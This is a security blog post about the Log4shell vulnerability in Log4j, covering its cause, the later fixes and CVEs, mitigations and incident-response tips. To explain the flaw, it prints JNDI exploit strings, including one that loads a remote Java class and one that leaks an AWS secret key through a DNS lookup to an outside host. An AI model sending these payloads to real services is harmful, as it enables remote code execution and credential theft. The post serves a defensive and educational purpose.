---
title: "[0x08] Log4shell memos"
date: 2021-12-18T14:21:00Z
categories: [vulnerability, exploitation]
draft: false
---

![Log4shell logo](/assets/images/log4shell.jpg)
Image source: [Kevin Beaumont, Twitter](https://twitter.com/GossiTheDog/status/1469252646745874435?s=20)

> On Friday 10th of December 2021, internet was set on fire. Or technically internet was full of flammable material and someone shared matches to everyone on that day. In this blog post, I will present my thoughts about the case.

## TL;DR

- Do not flame the developers of Log4j or open-source stuff in general for this issue
- Always use the newest version of Log4j
    - If patching or mitigating is not possible in short term, organizations should consider taking down the vulnerable service until it has been fixed
- Use default deny outbound
- Assume breach
- Happy hunting!

## What's Log4shell and why everyone is buzzing about it ?

Log4shell is a vulnerability found from versions 2.X of Log4j. The vulnerability is easy to exploit and allows an attacker to run their own code in the target system (Remote Code Execution, RCE). The seriousness of the Log4shell vulnerability cannot be exaggerated.

Log4j is an open-source component, which is widely used in different applications, including commercial products. Log4j is written in Java and is mainly used in Java applications. Log4j is *mainly* used in backend components which means fixing the problem does not require actions from users. As described, the component is widely used. Based on unverified sources, few examples of vulnerable services are [Apple](https://twitter.com/chvancooten/status/1469340927923826691?s=20), [Tesla](https://github.com/YfryTchsGD/Log4jAttackSurface/blob/master/pages/Tesla.md), and [Twitter](https://github.com/YfryTchsGD/Log4jAttackSurface/blob/master/pages/Twitter.md), which describes the scale of the problem pretty good.

{{< twitter user="chvancooten" id="1469340927923826691" >}}

All admins and information security professionals have been busy for the past week, but I can't even imagine how the week has been in the Log4j developer community. My warmest thoughts to you folks! I hope that this vulnerability reminds companies who use open-source code in their commercial products that they should also support these open-source projects financially. 

## How to know if this affects me?

As a user, there's no easy way to find it out. In this case it's best to trust your service provider, which is of course not optimal. Many bounty hunters and white hat hackers are trying to inject the exploit code everywhere to find out which services are vulnerable. At the moment internet is full of exploitation attempts and it's impossible to say which are attempts are malicious and not.

As an organization, try to find Log4j installations from your infra. And check this [list by NCSC-NL](https://github.com/NCSC-NL/log4shell/tree/main/software) to check status of the products you use!

As a side note, many forensics and blue team tools have been identified or rumored to be vulnerable. These tools include Carbon Black, ~~Splunk, IBM Qradar~~ [1], Autopsy, and Cellebrite. Imagine investigating evidence that contains the exploitation code and your forensic environment allows malicious actor in. This is good reminder why you should always do forensics without and internet access.

[1] These products are not vulnerable to Log4Shell. However, Qradar has vulnerable plugins and Splunk has vulnerable connectors.

## The vulnerability

The vulnerability is consequence of three different features or vulnerabilities in the Log4j:

1. Root cause of the vulnerability is lack of improper input validation (CWE-20). Basically user can input any string to the application and if the application is set to log for example requested URIs, the URI will end up to Log4j logger without any sanitation.

2. The Log4j happens to have lookup feature (yes, it's a feature introduced in version log4j-2.0-beta9), which allows requesting variables from the system running the Log4j component. This feature can be called from Log4j using `${variable_here}` You can request for example username on a Linux system by providing string `${env:USER}` to Log4j, and it will log the username from environment variable user and the value is the running the application.

3. Now we get to the interesting part... :D Java runtime has a [Java Naming and Directory Interface (JNDI)](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) which can be used to discover and look up data from remote endpoints. This feature can be called from Log4j by using the lookup method and adding `jndi` string to the lookup command: `${jndi:method:remoteaddress}`. JNDI allows multiple methods for the look-up: LDAP, DNS, NIS, NDS, RMI, and CORBA, which means we can use any of these methods to look up more data from a remote endpoint. Oh, and the best thing is that JNDI is not a new attack vector, it was [introduced in BHUSA 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf).

If we hosted our malicious Java class in `example.dfir.fi:4444/legit`, our exploitation string would be `${jndi:ldap:example.dfir.fi:4444/legit}`. Inputting this string to vulnerable application would cause the server to look up and execute our Java class hosted on our server.

If you are more interested how the vulnerability works, I suggest you to read [this write-up by Paul Ducklin](https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/) of Sophos.

## Version confusion and fixing the vulnerability

First of all, I've seen a lot of arguments that "we are not vulnerable as we use Log4j 1.X". This is true *when we talk about Log4shell* as Log4j 1.X is not vulnerable to this issue. Log4j 1.X however has many other issues, like CVE-2019-178571 in versions 1.2.X. CVE-2019-17571 has also [public PoC](https://0xsapra.github.io/website/CVE-2019-17571).

{{< twitter user="GossiTheDog" id="1469250605826850819" >}}

Log4j version 2.15.0 was released on 9th of December 2021 to fix the issue. The fix sets allowed LDAP hosts and java classes. Allowed LDAP hosts is set to prevent downloads from external sites and allowed java classes to prevent execution of malicious java classes. The version number is confusing as the version 2.15.0 was already released on 6th of December 2021. If you look inside the released version, you can see that the release tag inside `pom.xml` changed from release candidate 1 (rc1) to release candidate 2 (rc2). This means that the fix was actually in rc2 and if you downloaded the version 2.15.0 before the rc2 version was replaced in the product, you are still vulnerable to Log4shell.

![log4j-2.15.0](/assets/images/log4j-2.15.0.jpg)

Matthew Warner released a [blog post in Blumira](https://www.blumira.com/analysis-log4shell-local-trigger/) on 16th of December explaining that the fixes in version 2.15.0 are not sufficient. Based on the blog post, fixes introduced in version 2.15.0 can be bypassed by using JavaScript. The introduced attack requires that the vulnerability service is running on a machine used to browse to a website that has malicious JavaScript running that starts to scan local service ports on the victim's machine. When these services are found, the scripts sends the exploit code to the service. This attack can be considered as a watering hole attack. As the vulnerable service would be running on the victim's machine, I don't see this attack vector super serious.

On 13th of December, Apache released Log4j version 2.16.0. This version fixed the issue by disabling the JNDI by default. The version also removers support for Message Lookups. This version was released to fix RCE vulnerability CVE-2021-45046. This vulnerability was found few days after the Log4shell vulnerability was released. Based on the Log4j documentation, the vulnerability affects all Log4j 2.X versions but requires use of non-default configuration (`Pattern Layout` with a `Context Lookup`). [Márcio Almeida claimed on Twitter](https://twitter.com/marcioalm/status/1471740771581652995?s=20) that this is a bypass for Log4shell mitigation introduced in Log4j version 2.15.0. He claimed that `allowedLdapHost` restriction can be bypassed by using localhost and #-character in the LDAP query host. Turned out that the RCE works only when the vulnerable application is running on Unix (at least Mac OS X and FreeBSD) environment. This means that the CVE-2021-45046 can't be considered as bad as Log4shell because it's only considering Unix servers. It's likely that the `allowedClasses` restriction can still be bypassed by using legit class name but at the time of writing this blog post, there's no known way to download the class from remote endpoint (on version 2.15.0).

{{< twitter user="marcioalm" id="1471740771581652995" >}}

Today, on 18th of December, Apache released Log4j version 2.17.0. Based on the release table on Apache's website, it seems that the vulnerability was released in a hurry as the release date is formatted as `2021-MM-dd` (see the screenshot below). Once again, the version fixes a new vulnerability (CVE-2021-45105). In this case the vulnerability allows Denial-of-Service (DoS) on the vulnerable server. DoS vulnerabilities are not considered as severe as RCEs, as the vulnerability allows the attacker to affect only system availability. This vulnerability is similar to CVE-2021-45046 as it also non-default configurations from the system (`Pattern Layout` with a `Context Lookup`).

![U in hurry?](/assets/images/log4j-2.17.0.png)

The best solution to fix Log4shell, is to update Log4j version to the newest available, which was at the time of writing version 2.17.0. Based on the public information available at the moment, the first RCE safe version would be 2.16.0 at the moment.

The issue can also be contained by using default deny outbound, e.q. restricting outbound connections from the server (egress rules). The egress rules contain RCE, but the attack vector can still be used for data exfiltration, if the server can resolve domain names. For example if AWS secret keys are stored as an environment variable, it can be used as a subdomain and if an attacker has access to the name server of the used domain, they can see the query. This kind of attack could be achieved by injecting following string to vulnerable services:

```
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.dfir.fi/log4j}
```

There are also rumors of payloads that work without downloading anything from internet. I will update this blog post, if I come across with working one.

Successful mitigation of the vulnerability can be achieved by removing the vulnerable `JndiLookup` class from Log4j:

```
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

## Incident response tips

The vulnerability was reported to Apache in November 2021, but it has been in Log4j since version 2.0-beta9, which was released 8 years ago. The vulnerability was released on 10th of December and since then the scanning has been super wild. Cloudflare also claims that they have seen the first exploit attempts on 1st of December 2021. Taking these premises into account, we should assume our vulnerable internet facing services have been breached.

{{< twitter user="eastdakota" id="1469800951351427073" >}}

To start the investigation, you should take a look to logs. Look for any signs of the exploit string `${jndi:`. You should also note that latest exploitation attempts have been obfuscated for example to bypass WAF or to evade detection. To make the obfuscation easier, someone has released [Log4j payload generator tool](https://github.com/woodpecker-appstore/log4j-payload-generator) on GitHub. As shown in the image below, the output of the tool can be pretty hardcore.

![Obfuscated payload](/assets/images/little_obfuscation.png)

[Florian Roth has also released a nice scanner](https://github.com/Neo23x0/log4shell-detector) for Log4shell exploitation attempts. If you find exploitation attempts from access logs, please note that the HTTP code does not indicate if the exploitation was successful or not. The Log4j might log the requests whether the requested URI exists or not. It's also good to remind that you might not have all HTTP headers and POST payload stored anywhere, which makes detecting the issue and investigating the incident much harder. Thankfully all incident responders have already used to lack of visibility.

After locating the exploitation, you should examine what it does and where it tries to fetch the payload. When you know where the payload is downloaded from, check the firewall logs if you can confirm if the download was successfully. Next see where the payload is written. I know there has been a lot Mushtik and Kinsing distributed using the Log4shell. Both of them use cron for persistence, so you should check cronjobs running on the system. I wouldn't consider these payloads as severe threat for organization but I would be worried if there was anything else than these or a coin miner.

Based on the [AdvIntel blog post](https://www.advintel.io/post/ransomware-advisory-log4shell-exploitation-for-initial-access-lateral-movement), Conti ransomware also uses Log4shell for initial access and lateral movement. My bet is that in few weeks we see a bloom in ransomware cases that used Log4shell for the initial access. I am also certain that all logs regarding Log4j are not available to you in your SIEM. If you haven't started yet, now would be great time to start threat hunting and use successful Log4shell exploitation as your hypothesis.

## Disclaimer

I did not go deep into the different Java versions. Some vulnerabilities and fixes require correct version Java. Also, please note that these are my personal memos of the issue. Please also note that I've zero experience in developing Java and this blog post is written based on the information publicly available on 18th of December 2021.
